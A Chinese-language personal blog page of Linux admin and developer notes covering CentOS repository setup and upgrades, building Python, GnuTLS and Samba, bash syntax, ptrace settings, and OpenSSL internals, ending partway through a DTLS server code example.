Base - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos-vault/6.10/os/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos-vault/6.10/os/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos-vault/6.10/os/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos-vault/RPM-GPG-KEY-CentOS-6</span><br><span class="line"> </span><br><span class="line">#released updates </span><br><span class="line">[updates]</span><br><span class="line">name=CentOS-vault-6.10 - Updates - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos-vault/6.10/updates/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos-vault/6.10/updates/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos-vault/6.10/updates/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos-vault/RPM-GPG-KEY-CentOS-6</span><br><span class="line"> </span><br><span class="line">#additional packages that may be useful</span><br><span class="line">[extras]</span><br><span class="line">name=CentOS-vault-6.10 - Extras - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos-vault/6.10/extras/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos-vault/6.10/extras/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos-vault/6.10/extras/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos-vault/RPM-GPG-KEY-CentOS-6</span><br><span class="line"> </span><br><span class="line">#additional packages that extend functionality of existing packages</span><br><span class="line">[centosplus]</span><br><span class="line">name=CentOS-vault-6.10 - Plus - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos-vault/6.10/centosplus/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos-vault/6.10/centosplus/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos-vault/6.10/centosplus/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos-vault/RPM-GPG-KEY-CentOS-6</span><br><span class="line"> </span><br><span class="line">#contrib - packages by Centos Users</span><br><span class="line">[contrib]</span><br><span class="line">name=CentOS-vault-6.10 - Contrib - mirrors.aliyun.com</span><br><span class="line">failovermethod=priority</span><br><span class="line">baseurl=http://mirrors.aliyun.com/centos-vault/6.10/contrib/$basearch/</span><br><span class="line">        http://mirrors.aliyuncs.com/centos-vault/6.10/contrib/$basearch/</span><br><span class="line">        http://mirrors.cloud.aliyuncs.com/centos-vault/6.10/contrib/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/centos-vault/RPM-GPG-KEY-CentOS-6</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果是centos7的, 记得还需要改<code>RPM-GPG-KEY-CentOS-6</code> 为 <code>RPM-GPG-KEY-CentOS-7</code></p></li></ol><p>接着:<code>yum clean all</code>, <code>yum makecahe</code>.</p><h2 id="Centos-7-5更新7-9"><a href="#Centos-7-5更新7-9" class="headerlink" title="Centos 7.5更新7.9"></a>Centos 7.5更新7.9</h2><ol><li>下载centos 7.9的ISO <a href="https://mirrors.tuna.tsinghua.edu.cn/centos/7.9.2009/isos/x86_64/">下载链接</a></li><li>把文件拷贝进去</li><li>挂载iso<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir /mnt/cdrom</span><br><span class="line">$ mount ./CentOS-7-x86_64-DVD-2009.iso /mnt/cdrom</span><br></pre></td></tr></table></figure></li><li>更改源  <code>/etc/yum.repo.d/CentOS-Media.repo</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[c7-media]</span><br><span class="line">name=CentOS Media</span><br><span class="line">baseurl=file:///mnt/cdrom/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br></pre></td></tr></table></figure></li><li>更新<code>yum --disablerepo=* --enablerepo=c7-media update</code></li></ol><h3 id="Centos-6-x-安装python2-7"><a href="#Centos-6-x-安装python2-7" class="headerlink" title="Centos 6.x 安装python2.7"></a>Centos 6.x 安装python2.7</h3><ol><li><code>yum install openssl-devel</code></li><li>下载源码: <a href="https://www.python.org/ftp/python/2.7.13/Python-2.7.13.tar.xz">python 2.7.13源码</a>,  解压源码<code>tar Jxf  Python-2.7.13.tar.xz</code> </li><li><code>./configure --prefix=/usr/local/python27 --enable-shared</code></li><li><code>make &amp;&amp; make install</code>, <code>ln -s /usr/local/python27/bin/python /usr/bin/python27</code></li><li><code>echo &quot;/usr/loca/python27/lib&quot; &gt;&gt;/etc/ld.so.conf</code>, 执行<code>ldconfig</code></li><li>直接运行<code>python27</code>, 如果正常运行就ok.</li></ol><h2 id="bash-语法"><a href="#bash-语法" class="headerlink" title="bash 语法"></a>bash 语法</h2><h3 id="引用命令行参数"><a href="#引用命令行参数" class="headerlink" title="引用命令行参数"></a>引用命令行参数</h3><p><strong>直接引用</strong></p><p>$1,$2….<br>如果超过9, ${10}<br>${1:-8} 如果不存在1位置的变量, 默认给8<br>${parameter:?word} 可以默认给字符串</p><p><strong>flags</strong></p><p>​&#96;&#96;&#96;bash<br>while getopts u:a:f: flag#选项后面的冒号表示该选项需要参数<br>do<br>    case “${flag}” in<br>        u) username&#x3D;${OPTARG};;#参数存在$OPTARG中<br>        a) age&#x3D;${OPTARG};;<br>        f) fullname&#x3D;${OPTARG};;<br>    esac<br>done<br>echo “Username: $username”;<br>echo “Age: $age”;<br>echo “Full Name: $fullname”;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`sh userReg-flags.sh -f &#x27;John Smith&#x27; -a 25 -u john `</span><br><span class="line"></span><br><span class="line">getopts,它不支持长选项。 $OPTIND 表示当前argv索引位置.</span><br><span class="line"></span><br><span class="line">**$@**  </span><br><span class="line"></span><br><span class="line">​```bash</span><br><span class="line">i=1;</span><br><span class="line">for user in &quot;$@&quot; </span><br><span class="line">do</span><br><span class="line">    echo &quot;Username - $i: $user&quot;;</span><br><span class="line">    i=$((i + 1));</span><br><span class="line">done</span><br></pre></td></tr></table></figure><blockquote><p>$* ：和$@相同，但”$*“ 和 “$@”(加引号)并不同，”$*“将所有的参数解释成一个字符串，而”$@”是一个参数数组</p></blockquote><p><strong>shift operator</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">i=1;</span><br><span class="line">j=<span class="variable">$#</span>;<span class="comment"># $#是参数个数</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -le <span class="variable">$j</span> ] </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Username - <span class="variable">$i</span>: <span class="variable">$1</span>&quot;</span>;</span><br><span class="line">    i=$((i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">shift</span> 1; <span class="comment">#移动默认的argv的索引. 此处移1位, $1就变了</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if commands; then</span><br><span class="line">  commands</span><br><span class="line">[elif commands; then</span><br><span class="line">  commands...]</span><br><span class="line">[else</span><br><span class="line">  commands]</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><table><thead><tr><th>Operation</th><th>Effect</th></tr></thead><tbody><tr><td>[ ! EXPR ]</td><td>True if <strong>EXPR</strong> is false.</td></tr><tr><td>[ ( EXPR ) ]</td><td>Returns the value of <strong>EXPR</strong>. This may be used to override the normal precedence of operators.</td></tr><tr><td>[ EXPR1 -a EXPR2 ]</td><td>True if both <strong>EXPR1</strong> and <strong>EXPR2</strong> are true.</td></tr><tr><td>[ EXPR1 -o EXPR2 ]</td><td>True if either <strong>EXPR1</strong> or <strong>EXPR2</strong> is true.</td></tr><tr><td>[ <code>-a</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists.</td></tr><tr><td>[ <code>-b</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is a block-special file.</td></tr><tr><td>[ <code>-c</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is a character-special file.</td></tr><tr><td>[ <code>-d</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is a directory.</td></tr><tr><td>[ <code>-e</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists.</td></tr><tr><td>[ <code>-f</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is a regular file.</td></tr><tr><td>[ <code>-g</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and its SGID bit is set.</td></tr><tr><td>[ <code>-h</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is a symbolic link.</td></tr><tr><td>[ <code>-k</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and its sticky bit is set.</td></tr><tr><td>[ <code>-p</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is a named pipe (FIFO).</td></tr><tr><td>[ <code>-r</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is readable.</td></tr><tr><td>[ <code>-s</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and has a size greater than zero.</td></tr><tr><td>[ <code>-t</code> <code>FD</code> ]</td><td>True if file descriptor <code>FD</code> is open and refers to a terminal.</td></tr><tr><td>[ <code>-u</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and its SUID (set user ID) bit is set.</td></tr><tr><td>[ <code>-w</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is writable.</td></tr><tr><td>[ <code>-x</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is executable.</td></tr><tr><td>[ <code>-O</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is owned by the effective user ID.</td></tr><tr><td>[ <code>-G</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is owned by the effective group ID.</td></tr><tr><td>[ <code>-L</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is a symbolic link.</td></tr><tr><td>[ <code>-N</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and has been modified since it was last read.</td></tr><tr><td>[ <code>-S</code> <code>FILE</code> ]</td><td>True if <code>FILE</code> exists and is a socket.</td></tr><tr><td>[ <code>FILE1</code> <code>-nt</code> <code>FILE2</code> ]</td><td>True if <code>FILE1</code> has been changed more recently than <code>FILE2</code>, or if <code>FILE1</code> exists and <code>FILE2</code> does not.</td></tr><tr><td>[ <code>FILE1</code> <code>-ot</code> <code>FILE2</code> ]</td><td>True if <code>FILE1</code> is older than <code>FILE2</code>, or is <code>FILE2</code> exists and <code>FILE1</code> does not.</td></tr><tr><td>[ <code>FILE1</code> <code>-ef</code> <code>FILE2</code> ]</td><td>True if <code>FILE1</code> and <code>FILE2</code> refer to the same device and inode numbers.</td></tr><tr><td>[ <code>-o</code> OPTIONNAME ]</td><td>True if shell option “OPTIONNAME” is enabled.</td></tr><tr><td><code>[ -z</code> STRING ]</td><td>True of the length if “STRING” is zero.</td></tr><tr><td><code>[ -n</code> STRING ] or [ STRING ]</td><td>True if the length of “STRING” is non-zero.</td></tr><tr><td>[ STRING1 &#x3D;&#x3D; STRING2 ]</td><td>True if the strings are equal. “&#x3D;” may be used instead of “&#x3D;&#x3D;” for strict POSIX compliance.</td></tr><tr><td>[ STRING1 !&#x3D; STRING2 ]</td><td>True if the strings are not equal.</td></tr><tr><td>[ STRING1 &lt; STRING2 ]</td><td>True if “STRING1” sorts before “STRING2” lexicographically in the current locale.</td></tr><tr><td>[ STRING1 &gt; STRING2 ]</td><td>True if “STRING1” sorts after “STRING2” lexicographically in the current locale.</td></tr><tr><td>[ ARG1 OP ARG2 ]</td><td>“OP” is one of <code>-eq</code>, <code>-ne</code>, <code>-lt</code>, <code>-le</code>, <code>-gt</code> or <code>-ge</code>. These arithmetic binary operators return true if “ARG1” is equal to, not equal to, less than, less than or equal to, greater than, or greater than or equal to “ARG2”, respectively. “ARG1” and “ARG2” are integers.</td></tr></tbody></table><h2 id="编译Gnutls"><a href="#编译Gnutls" class="headerlink" title="编译Gnutls"></a>编译Gnutls</h2><p>基于Centos7</p><p>在<a href="https://www.gnutls.org/download.html">gntls</a>下载<a href="https://www.lysator.liu.se/~nisse/nettle/">libnettle</a> 和<a href="https://gmplib.org/">gmplib</a></p><ol><li>先编译gmplib, 安装后, <code>export GMP_CFLAGS=&quot;-I/usr/local/include&quot; GMP_LIBS=&quot;-L/usr/local/lib -lgmp&quot;</code></li><li>编译安装nettle, <code>./configure --prefix=/usr --enable-static --enable-mini-gmp</code></li><li><code>export PKG_CONFIG_PATH=/usr/local/lib/pkgconfig/:/usr/local/lib/pkgconfig/</code> 设置<code>pkg-config</code>的查找路径</li><li>设置lib路径, 编辑<code>/etc/ld.so.conf</code>, 添加一行<code>/usr/local/lib</code>, 执行<code>ldconfig -v</code></li><li>编译gnutls: <code>./configure --without-p11-kit</code></li></ol><p><a href="https://amon.org/gnutls">主要参考</a></p><h2 id="编译samba最新版"><a href="#编译samba最新版" class="headerlink" title="编译samba最新版"></a>编译samba最新版</h2><p>在安装好gnutls后, 安装需要的组件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ yum install python36-dns</span><br><span class="line">$ yum install python36-markdown</span><br><span class="line">$ yum install perl</span><br><span class="line">$ yum -y install perl-CPAN</span><br><span class="line">$ yum -y install popt-devel</span><br><span class="line">$ perl -MCPAN -e <span class="string">&#x27;install JSON&#x27;</span></span><br><span class="line">To install modules, you need to configure a <span class="built_in">local</span> Perl library directory or</span><br><span class="line">escalate your privileges.  CPAN can <span class="built_in">help</span> you by bootstrapping the <span class="built_in">local</span>::lib</span><br><span class="line">module or by configuring itself to use <span class="string">&#x27;sudo&#x27;</span> (<span class="keyword">if</span> available).  You may also</span><br><span class="line">resolve this problem manually <span class="keyword">if</span> you need to customize your setup.</span><br><span class="line"></span><br><span class="line">What approach <span class="keyword">do</span> you want?  (Choose <span class="string">&#x27;local::lib&#x27;</span>, <span class="string">&#x27;sudo&#x27;</span> or <span class="string">&#x27;manual&#x27;</span>)</span><br><span class="line"> [<span class="built_in">local</span>::lib] &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 输入enter</span><br><span class="line"></span><br><span class="line">Autoconfigured everything but <span class="string">&#x27;urllist&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Now you need to choose your CPAN mirror sites.  You can <span class="built_in">let</span> me</span><br><span class="line">pick mirrors <span class="keyword">for</span> you, you can select them from a list or you</span><br><span class="line">can enter them by hand.</span><br><span class="line"></span><br><span class="line">Would you like me to automatically choose some CPAN mirror</span><br><span class="line">sites <span class="keyword">for</span> you? (This means connecting to the Internet) [<span class="built_in">yes</span>] no &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 输入no</span><br><span class="line"></span><br><span class="line">Would you like to pick from the CPAN mirror list? [<span class="built_in">yes</span>] no &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 输入no</span><br><span class="line">Now you can enter your own CPAN URLs by hand. A <span class="built_in">local</span> CPAN mirror can be</span><br><span class="line">listed using a <span class="string">&#x27;file:&#x27;</span> URL like <span class="string">&#x27;file:///path/to/cpan/&#x27;</span></span><br><span class="line"></span><br><span class="line">CPAN.pm needs at least one URL <span class="built_in">where</span> it can fetch CPAN files from.</span><br><span class="line"></span><br><span class="line">Please enter your CPAN site: [] http://mirrors.ustc.edu.cn/CPAN/ &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 输入这个网址, 配置国内的源</span><br></pre></td></tr></table></figure><p>上面的组件安装完成后, 就可以配置编译了:</p><p><code>./configure --enable-debug --prefix=/home/vv/install-smb-4.17.2 --with-shared-modules=&#39;!vfs_snapper&#39;</code></p><h2 id="Linux-Ptrace的权限问题"><a href="#Linux-Ptrace的权限问题" class="headerlink" title="Linux Ptrace的权限问题"></a>Linux Ptrace的权限问题</h2><p>如果想避免同用户使用ptrace调试, 可以设置<code>prctl(PR_SET_DUMPABLE, 1LL, 0LL, 0LL, 0LL) </code>, <a href="https://www.rezilion.com/blog/the-race-to-limit-ptrace/">参考</a></p><p>与之相关的还有<code>/proc/sys/kernel/yama/ptrace_scope</code>, 这个也影响了ptrace的使用.</p><h2 id="OpenSSL技巧"><a href="#OpenSSL技巧" class="headerlink" title="OpenSSL技巧"></a>OpenSSL技巧</h2><p>如果想修改原始的send数据, <code>SSL_CTX_set_msg_callback(ctx, message_cb);</code>, 这个回调就是在send前触发.</p><p>如果想发送任意的加密数据, 可以使用<code>ssl-&gt;method-&gt;ssl_write_bytes(ssl, SSL3_RT_ALERT, data, data_length, &amp;written);</code> 去发送.</p><p>dtls server示例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/bio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PSK_KEY <span class="string">&quot;Key&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PSK_IDENTITY <span class="string">&quot;Ide&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;libcrypto.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;libssl.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,</span></span><br><span class="line"><span class="comment">     * DTLS1_VERSION)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> version;</span><br><span class="line">    <span class="comment">/* SSLv3 */</span></span><br><span class="line">    <span class="type">const</span> SSL_METHOD* method;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ssl_method_st</span> // 通过逆向<span class="title">FireDaemon</span> <span class="title">OpenSSL</span> 3\<span class="title">bin</span>\<span class="title">libcrypto</span>-3-<span class="title">x64</span>.<span class="title">dll</span>得到的, 只针对<span class="title">sslv3</span>, <span class="title">openssl</span>的版本会有不同.</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> version;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> mask;</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_new)(ssl_st*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_clear)(ssl_st*);</span><br><span class="line">    <span class="type">void</span>(__fastcall* ssl_free)(ssl_st*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_accept)(ssl_st*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_connect)(ssl_st*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_read)(ssl_st*, <span class="type">void</span>*, <span class="type">unsigned</span> __int64, <span class="type">unsigned</span> __int64*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* ssl_peek)(ssl_st*, <span class="type">void</span>*, <span class="type">unsigned</span> __int64, <span class="type">unsigned</span> __int64*);</span><br><span class="line">    <span class="type">int</span>(__fastcall* 